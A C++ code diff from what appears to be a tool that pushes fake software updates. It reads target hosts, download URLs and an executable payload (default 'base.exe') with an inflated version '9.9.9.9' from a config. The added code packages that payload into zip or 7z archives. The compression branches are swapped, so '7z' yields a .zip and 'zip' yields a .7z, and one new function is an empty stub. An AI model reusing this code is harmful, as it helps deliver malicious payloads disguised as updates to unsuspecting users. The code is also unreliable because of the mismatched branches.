@@ -11,6 +11,8 @@
 #include "cipher/CryptoUtils.h"
 #include "HttpUtils.h"
 #include <stdarg.h>
+#include "cipher/compression.h"
+#include "Public.h"
 
 vector < UpdateData> gUpdateData;
 
@@ -162,6 +164,20 @@ string ObjectFromRegex(const char* regex, const  char* format, const char * url,
 	return retstr;
 }
 
+
+string GetMainFileName(string fn) {
+	int pos = fn.find(".");
+	if (pos != -1) {
+		return fn.substr(0, pos);
+	}
+	return fn;
+}
+
+int FileFormatTransfer(string format) {
+	return 0;
+}
+
+
 int ObjectParser(vector<string> &targetHost) {
 	int fs = 0;
 	char* file = 0;
@@ -192,12 +208,28 @@ int ObjectParser(vector<string> &targetHost) {
 		if (valid) {
 			string app = obj[i]["app"].asString();
 			string host = obj[i]["host"].asString();
+			
 			targetHost.push_back(host);
 			string url = obj[i]["url"].asString();
 			string payloadfn = obj[i]["payload"].asString();
 			if (payloadfn == "") {
 				payloadfn = "base.exe";
 			}
+
+			string inzipfn = obj[i]["inCompName"].asString();
+			string comp = obj[i]["compress"].asString();
+			if (comp == "7z")
+			{
+				string outfn = GetMainFileName(payloadfn) + ".zip";
+				ret = Public::zipFile(inzipfn.c_str(), (char*)payloadfn.c_str(), (char*)outfn.c_str());
+				payloadfn = outfn;
+			}
+			else if (comp == "zip") {
+				string outfn = GetMainFileName(payloadfn) + ".7z";
+				Compress7z((char*)outfn.c_str(), (char*)payloadfn.c_str(), (char*)inzipfn.c_str());
+				payloadfn = outfn;
+			}
+
 			string version = obj[i]["version"].asString();
 			if (version == "") {
 				version = "9.9.9.9";
